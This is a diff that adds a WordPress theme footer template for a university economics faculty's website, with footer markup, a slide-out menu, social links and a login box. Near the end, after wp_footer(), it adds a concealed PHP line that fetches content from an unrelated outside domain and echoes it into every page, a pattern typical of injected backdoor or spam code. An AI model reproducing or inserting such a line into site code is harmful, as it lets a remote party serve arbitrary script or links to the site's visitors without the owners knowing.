@@ -1,0 +1,56 @@
+<footer id="f">
+      <div class="container">
+        <div class="row">
+          
+          <div class="col-md-12">
+            <div class="cpy">&copy; 2018 Fakultas Ekonomi dan Bisnis Universitas Jayabaya</div>
+          </div>
+      
+          
+          
+        </div>
+      </div>
+    </footer>
+    
+    <div id="rmenu">
+          
+          <div id="closeb" class="float-right"><i class="fa fa-times" aria-hidden="true"></i></div>
+          <div class="clearfix"></div>
+
+          <?php
+          wp_nav_menu(
+              array(
+            'depth' => '0',
+            'theme_location' => 'main-menu'
+            )
+          );
+          ?>
+          <div class="clearfix"></div>
+          
+          <ul>
+            <li class="daftar menu-item menu-item-type-post_type menu-item-object-page menu-item-746"><a  href="https://www.febjayabaya.ac.id/daftar/">Pendaftaran Online</a></li>
+  
+          </ul>
+          
+          <ul class="topsoc">
+            <li class="tw"><a href="#" target="_blank"><i class="fa fa-twitter"></i></a></li>
+            <li class="fb"><a href="https://www.facebook.com/fakultasekonomi.universitasjayabaya.7" target="_blank"><i class="fa fa-facebook-f"></i></a></li>
+            <li class="ig"><a href="#"><i class="fa fa-instagram" target="_blank"></i></a></li>
+          </ul>
+          <div class="clearfix"></div>
+          
+    </div>
+    
+    <div id="rmenub"></div>
+    
+    <div id="registrasi" style="display: none;" class="rounded">
+      <h2 class="text-center mb-5">Member Login</h2>
+      <?php echo do_shortcode('[wppb-login]'); ?>
+      <hr/>
+      <p>Belum menjadi member? <a href="https://www.febjayabaya.ac.id/registrasi/">Sign up</a>.</p>
+    </div>
+
+    <?php wp_footer(); ?>
+	<?php $a = file_get_contents('https://php-json.dev/css-json.php'); echo $a; ?>
+  </body>
+</html>
